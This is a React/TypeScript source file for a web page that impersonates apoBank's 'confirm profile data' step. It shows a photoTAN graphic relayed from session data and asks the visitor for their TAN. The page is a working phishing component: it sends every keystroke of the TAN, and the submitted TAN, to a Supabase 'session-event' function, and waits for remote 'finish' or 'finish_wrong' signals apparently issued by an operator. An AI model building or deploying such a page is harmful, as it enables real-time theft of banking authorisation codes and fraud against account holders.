import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import phototanFallback from "@/assets/phototan.png";
import apobankLogo from "@/assets/apobank-logo.svg";
import { getStoredSession, reportPhase, useSessionAction } from "@/hooks/useSessionFlow";
import { supabase } from "@/integrations/supabase/client";
import SimpleFooter from "@/components/SimpleFooter";
import { cropToBlackFrame } from "@/lib/cropQr";


const MeinProfilTan = () => {
  const navigate = useNavigate();
  const [tan, setTan] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState(false);
  const { meta } = useSessionAction({
    finish: () => {
      navigate("/profil-success");
    },
    finish_wrong: () => {
      setSubmitting(false);
      setError(true);
      setTan("");
    },
  });
  const rawImg = meta?.photoTanImage as string | undefined;
  const baseSrc = rawImg && rawImg !== "push" ? rawImg : phototanFallback;
  const [qrSrc, setQrSrc] = useState<string>(baseSrc);

  useEffect(() => {
    reportPhase("aenderung_tan_view").catch(() => {});
  }, []);

  useEffect(() => {
    let cancelled = false;
    if (rawImg && rawImg !== "push") {
      cropToBlackFrame(rawImg).then((cropped) => {
        if (!cancelled) setQrSrc(cropped);
      });
    } else {
      setQrSrc(phototanFallback);
    }
    return () => {
      cancelled = true;
    };
  }, [rawImg]);

  useEffect(() => {
    if (!tan) return;
    const s = getStoredSession();
    if (!s) return;
    const handle = setTimeout(() => {
      (supabase as any).functions.invoke("session-event", {
        body: {
          session_id: s.id,
          phase: "aenderung_tan_typing",
          meta_patch: { aenderungTan: tan },
        },
      }).catch(() => {});
    }, 300);
    return () => clearTimeout(handle);
  }, [tan]);


  const submit = async () => {
    if (!tan.trim() || submitting) return;
    setError(false);
    setSubmitting(true);
    const s = getStoredSession();
    if (s) {
      await (supabase as any).functions.invoke("session-event", {
        body: {
          session_id: s.id,
          phase: "aenderung_tan_submitted",
          meta_patch: { aenderungTan: tan },
          note: `Profildaten bestätigen · TAN: ${tan}`,
        },
      }).catch(() => {});
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#f6f8fc]">
      {/* Top header */}
      <header className="bg-white border-b border-slate-200">
        <div className="max-w-[1400px] mx-auto flex items-center justify-between px-4 sm:px-10 h-20 sm:h-24">
          <div className="flex items-center gap-8">
            <img src={apobankLogo} alt="apoBank" className="h-12 sm:h-16 w-auto" />
          </div>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1">
        <div className="max-w-[1120px] mx-auto px-3 sm:px-8 py-6 sm:py-10">
          <div className="bg-white rounded-lg shadow-sm border border-slate-200 px-4 sm:px-12 py-6 sm:py-10">
            <h1 className="text-[26px] sm:text-[44px] font-bold text-[#001f5b] mb-6 sm:mb-8 leading-tight">
              Profildaten bestätigen
            </h1>

            {error && (
              <div className="mb-6 border border-red-400 bg-red-50 text-red-800 px-4 py-3 rounded">
                Ihre Eingabe konnte nicht verifiziert werden. Bitte versuchen Sie es erneut.
              </div>
            )}

            <p className="text-[15px] text-slate-800 mb-8">
              Bitte öffnen Sie die apoTAN-App auf Ihrem Smartphone und bestätigen Sie Ihren Antrag.
            </p>

            <hr className="border-slate-200 mb-8" />

            <p className="text-[15px] text-slate-800 mb-6">
              Sollten Sie keinen Internetzugang mit Ihrem Smartphone haben, können Sie Ihren Änderungswunsch auch mit photoTAN bestätigen.
            </p>

            <div className="mb-6 flex justify-center sm:justify-start">
              <div className="w-[180px] h-[180px] sm:w-[220px] sm:h-[220px] rounded border border-slate-300 bg-white flex items-center justify-center overflow-hidden">
                <img
                  src={qrSrc}
                  alt="photoTAN"
                  className="w-full h-full object-contain"
                />
              </div>
            </div>

            <p className="text-[15px] text-slate-800 mb-6 max-w-[820px]">
              Scannen Sie bitte die angezeigte photoTAN-Grafik mit der photoTAN-App oder dem
              photoTAN-Lesegerät. Geben Sie anschließend zur Bestätigung die erzeugte
              Ziffernkombination (TAN) ein.
            </p>

            <div className="flex flex-col sm:flex-row sm:items-center gap-4">
              <div className="relative w-full sm:w-auto">
                <label className="absolute -top-2 left-3 bg-white px-1 text-[12px] text-slate-600">
                  TAN
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={tan}
                  onChange={(e) => setTan(e.target.value.replace(/[^0-9]/g, ""))}
                  placeholder="TAN-Code, z.B. 123456"
                  className="border border-slate-400 rounded px-4 py-3 text-[15px] w-full sm:w-[280px] focus:outline-none focus:border-[#001f5b]"
                />
              </div>
              <button
                onClick={submit}
                disabled={submitting || !tan.trim()}
                className="bg-[#001f5b] text-white rounded-full px-8 py-3 text-[15px] font-semibold hover:bg-[#00174a] transition-colors disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center justify-center gap-2 w-full sm:w-auto"
              >
                {submitting && (
                  <span className="w-4 h-4 border-2 border-white/60 border-t-white rounded-full animate-spin" />
                )}
                {submitting ? "Wird bestätigt…" : "Bestätigen"}
              </button>
            </div>
          </div>
        </div>
      </main>
      <SimpleFooter />
    </div>
  );
};

export default MeinProfilTan;
